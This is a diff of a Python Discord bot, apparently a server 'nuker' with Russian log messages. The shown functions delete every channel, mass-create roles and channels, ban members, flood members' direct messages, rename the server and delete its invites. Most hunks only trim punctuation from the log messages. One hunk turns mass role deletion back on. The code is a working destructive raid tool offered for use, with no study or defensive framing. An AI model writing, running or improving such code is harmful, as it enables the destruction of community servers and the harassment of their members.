@@ -205,7 +205,7 @@ client = commands.Bot(command_prefix=data['BOT_COMMAND_PREFIX'])
 async def CREATE_ROLE(ctx):
     try:
         await ctx.guild.create_role(name=data['ROLES_NAME'])
-        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создана роль!')
+        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создана роль')
     except:
         pass
 
@@ -243,7 +243,7 @@ async def CM_CREATE_ROLES(ctx):
         for x in range(250):
             asyncio.create_task(CREATE_ROLE(ctx))
         print(
-            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию ролей!'
+            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию ролей'
         )
     except:
         pass
@@ -265,12 +265,12 @@ async def CM_CDCHANNELS(ctx):
     try:
         for CHANNEL in ctx.guild.channels:
             asyncio.create_task(DELETE_OBJECT(CHANNEL))
-            print(f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Удалён канал!')
+            print(f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Удалён канал')
         for x in range(250):
             asyncio.create_task(NEW_CHANNEL(ctx))
-            print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан новый канал!')
+            print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан новый канал')
         print(
-            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию каналов!'
+            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию каналов'
         )
     except:
         raise
@@ -286,7 +286,7 @@ async def CM_MEMBER_BAN(ctx):
 
 async def CM_RENAME_GUILD(ctx):
     await ctx.guild.edit(name=data['RENAME_SERVER_TO'])
-    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Сервер переименован.')
+    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Сервер переименован')
 
 
 async def DM_USER(ctx, member):
@@ -296,7 +296,7 @@ async def DM_USER(ctx, member):
     except:
         print(
             Fore.RED +
-            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: Не удалось запустить флуд в лс.'
+            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: Не удалось запустить флуд в лс'
         )
 
 
@@ -322,7 +322,7 @@ async def CM_DELETE_ALL_INVITES(ctx):
         asyncio.create_task(DELETE_OBJECT(invite))
     print(
         Fore.RED +
-        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Созданы задачи по удалению всех приглашений!'
+        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Созданы задачи по удалению всех приглашений'
     )
 
 
@@ -349,7 +349,7 @@ async def nuke(ctx):
         asyncio.create_task(CM_CDCHANNELS(ctx))
 
     if data['NUKER_OPTIONS']['CDROLES']:
-        # asyncio.create_task(CM_DELETE_ROLES(ctx))
+        asyncio.create_task(CM_DELETE_ROLES(ctx))
         asyncio.create_task(CM_CREATE_ROLES(ctx))
 
     if data['NUKER_OPTIONS']['BAN_MEMBERS']:
